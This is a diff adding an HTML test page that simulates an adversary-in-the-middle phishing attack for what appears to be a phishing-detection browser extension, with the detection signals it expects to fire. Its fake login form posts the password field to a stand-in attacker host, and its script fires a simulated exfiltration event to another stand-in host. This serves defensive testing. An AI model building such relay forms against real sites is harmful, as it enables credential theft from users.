@@ -1,0 +1,55 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <title>SSO Simulation: AiTM Proxy Attack</title>
+  <style>
+    body { font-family: system-ui, sans-serif; max-width: 700px; margin: 50px auto; padding: 20px; background: #1a1a1a; color: #e0e0e0; }
+    .test-box { background: #2a1a1a; border: 1px solid #5a2727; border-radius: 12px; padding: 30px; margin: 20px 0; }
+    h1 { color: #ff6b6b; }
+    label { display: block; margin-bottom: 8px; color: #aaa; }
+    input { width: 100%; padding: 12px; border: 1px solid #444; border-radius: 8px; background: #1a1a1a; color: #fff; font-size: 16px; margin-bottom: 15px; }
+    button { padding: 14px 24px; background: #ff6b6b; color: #fff; border: none; border-radius: 8px; font-size: 16px; font-weight: 600; cursor: pointer; margin: 5px; }
+    .instructions { background: #2a1e1e; border: 1px solid #5a2727; border-radius: 8px; padding: 15px; margin-top: 20px; }
+    .badge { display: inline-block; padding: 4px 10px; background: #5a2727; color: #ff6b6b; border-radius: 4px; font-size: 12px; }
+    code { background: #333; padding: 2px 6px; border-radius: 4px; }
+    a { color: #4a9eff; }
+  </style>
+</head>
+<body>
+  <h1>⚠️ SSO Simulation: AiTM Proxy Attack</h1>
+  <p><span class="badge">SHOULD FIRE</span> AiTM proxy pattern should trigger signals</p>
+  
+  <div class="test-box">
+    <button onclick="clearState()" style="background: #666;">Clear Storage</button>
+  </div>
+  
+  <div class="test-box">
+    <h3 style="color: #ff6b6b; margin-top: 0;">🎣 Fake Login</h3>
+    <form action="https://evil-proxy.attacker.test/relay" method="POST">
+      <label for="password">Password</label>
+      <input type="password" id="password" placeholder="Click to trigger">
+    </form>
+    <button onclick="simulateAiTM()">Simulate AiTM Attack</button>
+  </div>
+  
+  <div class="instructions">
+    <strong>Expected:</strong> <code>form_action_origin_mismatch</code> + <code>novel_runtime_sequence_observed</code>
+  </div>
+  
+  <p><a href="../index.html">← Back</a></p>
+  
+  <script>
+    function clearState() {
+      chrome.storage.local.remove(['pw_sequence_baseline', 'pw_expected_origins_by_page_origin', 'pw_novel_sequences'], function() { alert('Cleared'); });
+    }
+    function simulateAiTM() {
+      document.getElementById('password').focus();
+      setTimeout(function() {
+        window.dispatchEvent(new CustomEvent('phishwatch_net_event', { detail: { destination_origin: 'https://evil-exfil.attacker.test', method: 'POST' } }));
+        alert('Check console for signals!');
+      }, 200);
+    }
+  </script>
+</body>
+</html>
